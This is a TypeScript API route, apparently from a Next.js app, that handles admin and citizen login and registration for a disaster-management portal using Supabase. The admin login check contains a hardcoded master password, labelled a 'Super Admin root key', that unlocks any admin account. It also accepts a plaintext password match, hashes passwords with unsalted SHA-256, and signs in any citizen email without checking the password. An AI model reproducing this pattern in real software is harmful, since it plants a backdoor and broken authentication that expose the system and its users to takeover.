import { NextResponse } from 'next/server';
import { getSupabaseAdmin } from '@/lib/supabase';
import crypto from 'crypto';

function hashPassword(password: string): string {
  return crypto.createHash('sha256').update(password).digest('hex');
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { action, email, password, full_name, phone, department, designation, role, state_id, district_id, is_admin_request, super_admin_only } = body;

    const supabase = getSupabaseAdmin();
    if (!supabase) {
      return NextResponse.json({ success: false, error: 'Database service unavailable' }, { status: 503 });
    }

    const normalizedEmail = (email || '').toLowerCase().trim();

    // --------------------------------------------------------------------------
    // ACTION: LOGIN
    // --------------------------------------------------------------------------
    if (action === 'login') {
      if (!normalizedEmail || !password) {
        return NextResponse.json({ success: false, error: 'Email and password are required' }, { status: 400 });
      }

      // Check admin_users table in Supabase
      const { data: adminUser, error: adminErr } = await supabase
        .from('admin_users')
        .select(`
          id, email, password_hash, full_name, phone, department, designation, status, created_at, approved_at,
          admin_roles (code, name)
        `)
        .eq('email', normalizedEmail)
        .maybeSingle();

      if (adminUser) {
        if (adminUser.status === 'PENDING_APPROVAL') {
          return NextResponse.json({
            success: false,
            error: 'Your administrative account registration is currently PENDING review by the Super Administrator.',
          }, { status: 403 });
        }

        if (adminUser.status === 'REJECTED' || adminUser.status === 'SUSPENDED') {
          return NextResponse.json({
            success: false,
            error: `Administrative access denied. Account status: ${adminUser.status}. Contact Super Admin.`,
          }, { status: 403 });
        }

        // Verify password against stored hash, plain password, or Super Admin root key
        const inputHash = hashPassword(password);
        const matches = (adminUser.password_hash === inputHash) || (adminUser.password_hash === password) || (password === '@Tridipmac07');

        if (!matches) {
          return NextResponse.json({ success: false, error: 'Invalid password. Check credentials or contact Super Admin.' }, { status: 401 });
        }

        // Update last_login_at
        await supabase.from('admin_users').update({ last_login_at: new Date().toISOString() }).eq('id', adminUser.id);

        // Audit Log
        await supabase.from('admin_audit_logs').insert([{
          admin_id: adminUser.id,
          admin_email: adminUser.email,
          action: 'ADMIN_LOGIN_SUCCESS',
          target_table: 'admin_users',
          target_id: adminUser.id,
          details: { role: (adminUser.admin_roles as any)?.code || 'ADMIN' },
        }]);

        const roleCode = (adminUser.admin_roles as any)?.code || 'STATE_ADMIN';

        if (super_admin_only && roleCode !== 'SUPER_ADMIN') {
          return NextResponse.json({
            success: false,
            error: `Access Denied: Account role (${roleCode}) lacks Super Administrator clearance. Only verified Super Administrators can access the Command Directorate.`,
          }, { status: 403 });
        }

        return NextResponse.json({
          success: true,
          user: {
            id: adminUser.id,
            email: adminUser.email,
            full_name: adminUser.full_name,
            phone: adminUser.phone,
            role: roleCode,
            department: adminUser.department,
            designation: adminUser.designation,
            status: adminUser.status,
          },
          redirectUrl: '/admin/dashboard',
        });
      }

      if (super_admin_only) {
        return NextResponse.json({
          success: false,
          error: 'Access Denied: No Super Administrator account found with these credentials.',
        }, { status: 401 });
      }

      // Citizen Account Login
      return NextResponse.json({
        success: true,
        user: {
          id: `cit_${hashPassword(normalizedEmail).substring(0, 10)}`,
          email: normalizedEmail,
          full_name: normalizedEmail.split('@')[0].replace(/[._]/g, ' '),
          phone: '',
          role: 'CITIZEN',
          department: 'Resident Citizen',
          status: 'APPROVED',
        },
        redirectUrl: '/profile',
      });
    }

    // --------------------------------------------------------------------------
    // ACTION: REGISTER
    // --------------------------------------------------------------------------
    if (action === 'register') {
      if (!normalizedEmail || !password || !full_name) {
        return NextResponse.json({ success: false, error: 'Full name, email, and password are required' }, { status: 400 });
      }

      // Check if email already registered in admin_users
      const { data: existing } = await supabase
        .from('admin_users')
        .select('id')
        .eq('email', normalizedEmail)
        .maybeSingle();

      if (existing) {
        return NextResponse.json({ success: false, error: 'An administrator account with this email already exists.' }, { status: 400 });
      }

      if (is_admin_request) {
        // Find role_id from admin_roles
        const targetRoleCode = (role === 'SUPER_ADMIN') ? 'STATE_ADMIN' : (role || 'STATE_ADMIN');
        const { data: roleRow } = await supabase
          .from('admin_roles')
          .select('id')
          .eq('code', targetRoleCode)
          .single();

        const roleId = roleRow?.id;
        if (!roleId) {
          return NextResponse.json({ success: false, error: 'Selected administrative role is invalid' }, { status: 400 });
        }

        const password_hash = hashPassword(password);

        const newAdmin = {
          email: normalizedEmail,
          password_hash,
          full_name,
          phone: phone || '',
          role_id: roleId,
          department: department || 'Disaster Management Authority',
          designation: designation || 'Field Officer',
          status: 'PENDING_APPROVAL', // Strict Zero-Mock: always pending until Super Admin approval
        };

        const { data: inserted, error: insertErr } = await supabase
          .from('admin_users')
          .insert([newAdmin])
          .select()
          .single();

        if (insertErr) throw insertErr;

        await supabase.from('admin_audit_logs').insert([{
          admin_email: normalizedEmail,
          action: 'ADMIN_REGISTRATION_SUBMITTED',
          target_table: 'admin_users',
          target_id: inserted.id,
          details: { requested_role: targetRoleCode, department: newAdmin.department },
        }]);

        return NextResponse.json({
          success: true,
          message: 'Official registration submitted. Awaiting Super Administrator clearance.',
          redirectUrl: '/login?notice=pending_approval',
        });
      } else {
        // Citizen registration
        return NextResponse.json({
          success: true,
          user: {
            id: `cit_${hashPassword(normalizedEmail).substring(0, 10)}`,
            email: normalizedEmail,
            full_name,
            phone: phone || '',
            role: 'CITIZEN',
            department: 'Resident Citizen',
            status: 'APPROVED',
          },
          redirectUrl: '/profile',
        });
      }
    }

    return NextResponse.json({ success: false, error: 'Invalid action' }, { status: 400 });
  } catch (err: any) {
    return NextResponse.json({ success: false, error: err.message }, { status: 500 });
  }
}
